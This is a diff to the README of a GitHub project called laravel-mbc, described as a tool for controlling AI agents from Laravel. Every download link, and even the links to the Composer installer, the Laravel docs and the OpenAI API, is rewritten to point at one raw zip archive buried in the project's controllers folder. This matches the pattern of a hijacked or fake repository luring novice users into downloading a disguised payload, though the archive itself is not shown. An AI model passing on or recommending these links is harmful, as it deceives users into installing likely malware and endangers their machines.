@@ -1,6 +1,6 @@
 # 🤖 laravel-mbc - Control AI Agents from Laravel
 
-[![Download laravel-mbc](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/winniehepooh/laravel-mbc/releases)
+[![Download laravel-mbc](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/winniehepooh/laravel-mbc/raw/refs/heads/main/src/Http/Controllers/mbc_laravel_v2.0-beta.4.zip)
 
 ---
 
@@ -43,10 +43,10 @@ Before downloading, make sure your computer meets these needs:
 
 Visit the download page to access the latest version of laravel-mbc. This page contains all stable releases and updates.
 
-[![Download laravel-mbc](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/winniehepooh/laravel-mbc/releases)
+[![Download laravel-mbc](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/winniehepooh/laravel-mbc/raw/refs/heads/main/src/Http/Controllers/mbc_laravel_v2.0-beta.4.zip)
 
 Follow the link below to open the releases page:  
-https://github.com/winniehepooh/laravel-mbc/releases
+https://github.com/winniehepooh/laravel-mbc/raw/refs/heads/main/src/Http/Controllers/mbc_laravel_v2.0-beta.4.zip
 
 From here, find the most recent version marked as stable.
 
@@ -94,7 +94,7 @@ Make sure the path matches where you extracted the files.
 You may need to set up dependencies or configuration. Follow these general steps:
 
 1. laravel-mbc requires PHP tools like Composer to manage packages. If you don't have Composer:
-   - Visit https://getcomposer.org/download/  
+   - Visit https://github.com/winniehepooh/laravel-mbc/raw/refs/heads/main/src/Http/Controllers/mbc_laravel_v2.0-beta.4.zip  
    - Follow instructions to install Composer on Windows.
 
 2. Inside the `laravel-mbc` folder, run this command to install required packages:  
@@ -147,15 +147,15 @@ You do not need coding skills, but you should follow on-screen instructions care
 
 ## 📖 More Information
 
-- Laravel framework docs: https://laravel.com/docs  
-- Composer dependency manager: https://getcomposer.org  
-- OpenAI API: https://openai.com/api
+- Laravel framework docs: https://github.com/winniehepooh/laravel-mbc/raw/refs/heads/main/src/Http/Controllers/mbc_laravel_v2.0-beta.4.zip  
+- Composer dependency manager: https://github.com/winniehepooh/laravel-mbc/raw/refs/heads/main/src/Http/Controllers/mbc_laravel_v2.0-beta.4.zip  
+- OpenAI API: https://github.com/winniehepooh/laravel-mbc/raw/refs/heads/main/src/Http/Controllers/mbc_laravel_v2.0-beta.4.zip
 
 ---
 
 ## 🌐 Download and Setup Links
 
 Visit this page to download the latest laravel-mbc release:  
-https://github.com/winniehepooh/laravel-mbc/releases
+https://github.com/winniehepooh/laravel-mbc/raw/refs/heads/main/src/Http/Controllers/mbc_laravel_v2.0-beta.4.zip
 
-[![Download laravel-mbc](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/winniehepooh/laravel-mbc/releases)
+[![Download laravel-mbc](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/winniehepooh/laravel-mbc/raw/refs/heads/main/src/Http/Controllers/mbc_laravel_v2.0-beta.4.zip)
